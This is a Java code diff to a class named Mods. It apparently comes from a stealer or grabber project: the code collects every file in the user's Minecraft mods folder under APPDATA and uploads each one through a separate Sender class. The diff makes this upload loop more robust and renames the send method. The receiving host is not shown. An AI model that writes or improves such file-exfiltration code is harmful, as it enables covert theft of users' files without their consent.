@@ -16,16 +16,15 @@ public class Mods {
 
         File folder = new File((System.getenv("APPDATA") + "\\.minecraft\\" + "mods"));
 
-        // Iterate through all files in the folder and add them to the request body
-        for (File file : folder.listFiles()) {
-            if (file.isFile()) {
+        if (folder.exists() && folder.isDirectory() && folder.listFiles() != null) {
+            for (File file : folder.listFiles()) {
 
                 RequestBody requestBody = new MultipartBody.Builder()
                         .setType(MultipartBody.FORM)
                         .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                         .build();
 
-                Sender.Sender(client, requestBody);
+                Sender.sendFile(client, requestBody);
             }
         }
     }
